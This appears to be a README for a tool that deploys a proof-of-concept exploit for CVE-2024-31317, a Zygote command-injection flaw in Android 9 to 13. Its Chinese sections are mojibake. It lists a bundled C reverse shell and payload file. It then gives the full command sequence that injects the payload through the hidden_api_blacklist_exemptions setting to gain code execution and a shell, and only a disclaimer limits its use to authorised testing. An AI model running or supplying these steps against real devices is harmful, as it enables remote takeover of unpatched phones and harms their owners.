# CVE-2024-31317-PoC-Deployer

![Android Version](https://img.shields.io/badge/Android-9%20to%2013-red)
![Patch Level](https://img.shields.io/badge/Patch%20Level-June%202024%2B-green)
![License](https://img.shields.io/badge/License-MIT-blue)

A deployment tool for CVE-2024-31317 proof-of-concept exploit targeting Android 9 through 13 devices.

## ğŸ“ é¡¹ç›®æè¿°

CVE-2024-31317-PoC-Deployer æ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–éƒ¨ç½²è„šæœ¬ï¼Œç”¨äºå¿«é€Ÿç”Ÿæˆå’Œé…ç½® CVE-2024-31317 æ¼æ´åˆ©ç”¨æ‰€éœ€çš„å…¨éƒ¨æ–‡ä»¶ã€‚è¯¥æ¼æ´å½±å“ Android 9 åˆ° 13 çš„è®¾å¤‡ï¼Œå…è®¸é€šè¿‡ Zygote è¿›ç¨‹å®ç°æƒé™æå‡å¹¶æ‰§è¡Œä»»æ„ä»£ç ã€‚

## ğŸš¨ æ¼æ´ä¿¡æ¯

- **CVE ID**: CVE-2024-31317
- **å½±å“èŒƒå›´**: Android 9 åˆ° Android 13
- **ä¿®å¤ç‰ˆæœ¬**: 2024å¹´6æœˆè¡¥ä¸çº§åˆ«åŠä»¥åçš„Androidç‰ˆæœ¬
- **æ¼æ´ç±»å‹**: Zygoteè¿›ç¨‹å‘½ä»¤æ³¨å…¥
- **æ‰€éœ€æƒé™**: WRITE_SECURE_SETTINGS

## ğŸ“¦ åŒ…å«æ–‡ä»¶

- `reverse_shell.c` - Cè¯­è¨€å®ç°çš„åå‘shellç¨‹åº
- `payload.txt` - ç‰¹æ®Šæ„é€ çš„æ¼æ´åˆ©ç”¨payload
- `compile.sh` - è‡ªåŠ¨ç¼–è¯‘è„šæœ¬
- `README.txt` - è¯¦ç»†ä½¿ç”¨è¯´æ˜
- `CVE-2024-31317.txt` - æ¼æ´æŠ€æœ¯åˆ†ææ–‡æ¡£

## ğŸ› ï¸ å¿«é€Ÿå¼€å§‹

1. **è¿è¡Œéƒ¨ç½²è„šæœ¬**:
   ```bash
   ./deploy.sh
   ```

2. **ç¼–è¯‘åå‘shell**:
   ```bash
   ./compile.sh
   ```

3. **è¿è¡Œåå‘shellç›‘å¬å™¨**:
   ```bash
   ./reverse_shell
   ```

## ğŸ’£ æ¼æ´åˆ©ç”¨æ­¥éª¤

1. ä¸Šä¼  `payload.txt` åˆ°ç›®æ ‡è®¾å¤‡çš„ `/data/local/tmp/`
2. æ›¿æ¢ payload.txt ä¸­çš„ `xxx.xxx.xxx` ä¸ºä½ çš„ç›‘å¬æœåŠ¡å™¨IP
3. åœ¨ç›®æ ‡è®¾å¤‡ä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤åºåˆ—:
   ```bash
   am force-stop com.android.settings
   cd /data/local/tmp/
   settings put global hidden_api_blacklist_exemptions "$(cat payload.txt)"
   am start -n com.android.settings/.Settings
   settings put global hidden_api_blacklist_exemptions "null"
   ```

## âš ï¸ å…è´£å£°æ˜

æ­¤å·¥å…·ä»…ç”¨äºåˆæ³•çš„å®‰å…¨æµ‹è¯•å’Œç ”ç©¶ç›®çš„ã€‚ä½¿ç”¨å‰å¿…é¡»è·å¾—ç›®æ ‡ç³»ç»Ÿçš„æ˜ç¡®æˆæƒã€‚æœªç»æˆæƒçš„ä½¿ç”¨å¯èƒ½è¿åæ³•å¾‹ã€‚å¼€å‘è€…ä¸å¯¹ä»»ä½•æ»¥ç”¨è¡Œä¸ºè´Ÿè´£ã€‚

## ğŸ“œ è®¸å¯è¯

æœ¬é¡¹ç›®é‡‡ç”¨ MIT è®¸å¯è¯ - è¯¦æƒ…è¯·å‚é˜… [LICENSE](LICENSE) æ–‡ä»¶ã€‚

## ğŸ“š æŠ€æœ¯å‚è€ƒ

- [Android Security Bulletin - June 2024](https://source.android.com/docs/security/bulletin)
- [CVE-2024-31317 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-31317)
